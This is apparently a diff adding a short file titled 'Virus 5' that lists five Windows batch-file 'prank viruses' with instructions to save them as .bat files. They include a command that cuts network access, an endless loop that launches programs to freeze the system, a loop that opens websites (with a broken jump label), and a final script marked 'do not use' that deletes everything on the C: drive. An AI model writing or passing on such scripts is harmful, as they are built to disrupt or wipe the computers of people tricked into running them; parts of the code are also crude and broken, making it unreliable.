@@ -1,0 +1,66 @@
+Virus  5
+
+1.
+internet disable
+----------
+@echo off
+ipconfig/release
+----------
+save with .bat
+==============
+
+2
+-----
+@echo off
+color 02
+:start
+echo %random% %random% %random% %random% %random% 
+goto start
+-----
+name.bat
+Note: %random%  10 or 20 time..
+
+3
+-----
+@echo off
+:a
+start mspaint
+start cmd
+start window
+start calc
+goto a
+-----
+name.bat
+freez + crease sys
+
+4
+--------
+@echo off
+:b
+start www.youtube.com
+start www.facebook.com
+start www.google.com
+goto x
+-------
+name.bat
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+5 do not use....
+/Crease/Format c/: drive
+@echo off
+Del C: *.* |y
+save with .bat extension.
